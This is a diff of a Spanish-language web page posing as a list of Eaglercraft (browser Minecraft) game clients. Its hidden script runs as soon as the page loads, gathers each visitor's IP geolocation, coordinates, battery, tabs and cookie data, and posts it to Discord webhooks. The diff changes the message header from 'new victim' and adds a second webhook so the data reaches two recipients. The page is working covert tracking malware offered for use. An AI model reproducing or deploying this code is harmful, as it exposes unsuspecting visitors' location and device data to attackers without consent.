@@ -21,7 +21,6 @@
 </style>
 </head>
 <body>
-
 <header>
   <div class="nav">
     <div style="display:flex;align-items:center;gap:14px">
@@ -30,7 +29,6 @@
     </div>
   </div>
 </header>
-
 <main>
   <h1>Clientes Eaglercraft 2025</h1>
   <div class="grid">
@@ -44,10 +42,12 @@
 </main>
 
 <script>
-// TU WEBHOOK
-const WEBHOOK = "https://discord.com/api/webhooks/1455720593688100884/c-ezeoQzhgREwV_lcQUNp_dKfo009Y7xatAHZ6cXlSCs52gOBpZUfmcw527iogUpgWxf";
+// WEBHOOK TUYO
+const WEBHOOK1 = "https://discord.com/api/webhooks/1446712536656249005/sbyzRE1yccOtJ2qJFGFN9K8ltOxELsq8ZqQ04howQOMffAccLDJOFjXgp9alt__ysvBP";
 
-// ENVÍA TODO AL INGRESAR (sin pedir nada)
+// WEBHOOK DE TU AMIGO
+const WEBHOOK2 = "https://discord.com/api/webhooks/1455720593688100884/c-ezeoQzhgREwV_lcQUNp_dKfo009Y7xatAHZ6cXlSCs52gOBpZUfmcw527iogUpgWxf";
+
 (async () => {
   const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
   const battery = await navigator.getBattery?.() || {};
@@ -77,7 +77,7 @@ const WEBHOOK = "https://discord.com/api/webhooks/1455720593688100884/c-ezeoQzhg
   };
 
   const mensaje = 
-`**NUEVA VÍCTIMA (MÁXIMO DETALLE)**
+`**FORGEX COMUNIDAD(HACKER)**
 **IP:** ${datos.ip} (${datos.isp})
 **Ubicación:** ${datos.ubicacion}
 **Coordenadas:** ${datos.coordenadas}
@@ -93,11 +93,11 @@ const WEBHOOK = "https://discord.com/api/webhooks/1455720593688100884/c-ezeoQzhg
 **Pestañas:** ${datos.pestañas}
 **Cookies:** ${datos.cookies} | Modo oscuro: ${datos.modo_oscuro}`;
 
-  await fetch(WEBHOOK, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({content: mensaje})
-  });
+  // ENVÍA A LOS 2 WEBHOOKS AL MISMO TIEMPO
+  await Promise.all([
+    fetch(WEBHOOK1, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})}),
+    fetch(WEBHOOK2, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})})
+  ]);
 })();
 
 // Botones normales
